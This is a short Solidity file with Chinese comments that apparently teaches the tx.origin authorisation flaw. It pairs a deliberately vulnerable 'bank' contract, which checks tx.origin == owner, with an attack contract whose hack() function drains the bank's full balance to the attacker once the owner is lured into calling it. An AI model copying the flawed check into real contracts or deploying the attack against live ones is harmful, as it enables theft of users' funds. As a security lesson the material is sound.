// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract TXOrigin {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    //使用合约调用此方法的话，tx.origin=用户A，攻击方法就是，让owner调用攻击合约，攻击合约调用bank合约的tra函数
    //即可通过tx.origin == owner验证。
    //也就是call方法的调用语境
    function tra(address payable _to, uint256 amount) public {
        require(tx.origin == owner, "error:not owner");
        (bool success, ) = _to.call{value: amount}("");
        require(success, "error:must success");
    }
}

contract attack {
    address payable public hacker;
    TXOrigin bank;

    constructor(TXOrigin _bank) {
        bank = TXOrigin(_bank);
        hacker = payable(msg.sender);
    }

    function hack() public {
        bank.tra(hacker, address(bank).balance);
    }
}
